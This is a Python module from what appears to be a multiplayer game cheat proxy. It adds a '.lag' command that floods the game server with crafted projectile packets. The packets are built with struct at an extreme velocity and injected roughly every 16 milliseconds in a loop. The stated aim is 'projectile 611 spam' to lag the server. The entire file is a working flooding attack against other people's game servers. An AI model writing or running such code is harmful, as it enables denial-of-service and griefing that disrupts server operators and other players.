
import asyncio
import struct
from .registry import command
from .context import COLOR_ERR, COLOR_SUC, COLOR_INF

def build_solar_eruption_lag(proj_id: int, owner_id: int, x: float, y: float) -> bytes:
    flags = 0x03
    spawn_x = x
    spawn_y = y + 3200.0
    vel_x = 0.0
    vel_y = 100000000.0
    payload = struct.pack('<hffffBhB', proj_id, spawn_x, spawn_y, vel_x, vel_y, owner_id, 611, flags)
    payload += struct.pack('<ff', -1.0, -1.0)
    body = bytes([27]) + payload
    return struct.pack('<H', len(body) + 2) + body

async def lag_task(ctx):
    print("\n[lag] --- thread started ---")

    proj_id_counter = 900
    try:
        while getattr(ctx.state, 'lag_active', False):
            if getattr(ctx.state, 'connected', True) and ctx.state.my_slot != -1:
                player = ctx.state.players.get(ctx.state.my_slot)

                if player and player.active:
                    pkt = build_solar_eruption_lag(proj_id_counter, ctx.state.my_slot, player.x, player.y)
                    await ctx.inject_server(pkt)

                    proj_id_counter += 1
                    if proj_id_counter > 999:
                        proj_id_counter = 900

            await asyncio.sleep(0.016)

    except asyncio.CancelledError:
        pass
    except Exception as e:
        print(f"[lag] error: {e}")
    finally:
        print("[lag] --- thread finished ---")

@command(".lag")
async def cmd_lag(ctx, line, parts):
    is_active = getattr(ctx.state, 'lag_active', False)

    if not is_active:
        ctx.state.lag_active = True
        await ctx.reply("lag enabled. generating projectile 611 spam...", COLOR_SUC)
        asyncio.create_task(lag_task(ctx))
    else:
        ctx.state.lag_active = False
        await ctx.reply("lag disabled.", COLOR_ERR)